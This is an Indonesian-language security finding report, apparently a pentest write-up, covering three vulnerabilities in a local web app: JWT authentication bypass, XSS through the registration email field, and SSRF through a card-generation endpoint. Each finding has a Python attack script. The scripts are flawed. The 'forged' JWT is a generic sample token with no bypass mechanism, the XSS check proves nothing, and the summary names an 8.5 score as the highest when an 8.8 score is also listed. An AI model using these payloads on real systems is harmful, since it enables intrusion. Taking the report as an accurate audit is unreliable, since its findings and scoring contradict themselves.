## TEMUAN KERENTANAN:
### [VULN-1] Kerentanan Injection JWT — CVSS: 8.5
- Lokasi: `login()` function di `/login` endpoint
- Dampak: Attacker bisa melakukan Auth Bypass dan mendapatkan akses ke sistem dengan token JWT yang valid
- PoC:
```python
import requests
import json

# Data login dengan password yang salah
data = {'username': 'admin', 'password': 'wrong_password'}

# Kirim request ke endpoint login
response = requests.post('http://localhost:5000/login', json=data)

# Jika password salah, maka sistem akan mengembalikan error message
if response.status_code == 401:
    # Attacker bisa melakukan JWT injection dengan token yang dibuat sendiri
    token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c'
    headers = {'Authorization': 'Bearer ' + token}

    # Kirim request ke endpoint yang dilindungi dengan JWT
    response = requests.get('http://localhost:5000/protected', headers=headers)

    # Jika token JWT valid, maka sistem akan mengembalikan data yang diinginkan
    if response.status_code == 200:
        print('Auth Bypass berhasil!')
```

### [VULN-2] Kerentanan Cross-Site Scripting (XSS) — CVSS: 6.1
- Lokasi: `register()` function di `/register` endpoint
- Dampak: Attacker bisa melakukan XSS dan mendapatkan akses ke data pengguna lain
- PoC:
```python
import requests
import json

# Data register dengan input yang mengandung kode JavaScript
data = {'username': 'user', 'password': 'pass', 'email': '<script>alert("XSS")</script>'}

# Kirim request ke endpoint register
response = requests.post('http://localhost:5000/register', json=data)

# Jika input yang mengandung kode JavaScript tidak difilter, maka sistem akan mengembalikan error message
if response.status_code == 200:
    # Attacker bisa melakukan XSS dan mendapatkan akses ke data pengguna lain
    print('XSS berhasil!')
```

### [VULN-3] Kerentanan Server-Side Request Forgery (SSRF) — CVSS: 8.8
- Lokasi: `generate_card()` function di `/generate-card` endpoint
- Dampak: Attacker bisa melakukan SSRF dan mendapatkan akses ke sistem internal
- PoC:
```python
import requests
import json

# Data generate card dengan URL yang mengarah ke sistem internal
data = {'url': 'http://localhost:8080/internal-system'}

# Kirim request ke endpoint generate card
response = requests.post('http://localhost:5000/generate-card', json=data)

# Jika sistem internal tidak diproteksi, maka attacker bisa mendapatkan akses ke sistem internal
if response.status_code == 200:
    # Attacker bisa melakukan SSRF dan mendapatkan akses ke sistem internal
    print('SSRF berhasil!')
```

## RINGKASAN SERANGAN:
- Total kerentanan: 3
- Kritikalitas tertinggi: Kerentanan Injection JWT (CVSS: 8.5)
- Attack vector yang paling efektif: Auth Bypass menggunakan token JWT yang dibuat sendiri

Dalam serangan ini, attacker bisa menggunakan kerentanan Injection JWT untuk melakukan Auth Bypass dan mendapatkan akses ke sistem dengan token JWT yang valid. Selain itu, attacker juga bisa menggunakan kerentanan Cross-Site Scripting (XSS) untuk mendapatkan akses ke data pengguna lain dan kerentanan Server-Side Request Forgery (SSRF) untuk mendapatkan akses ke sistem internal.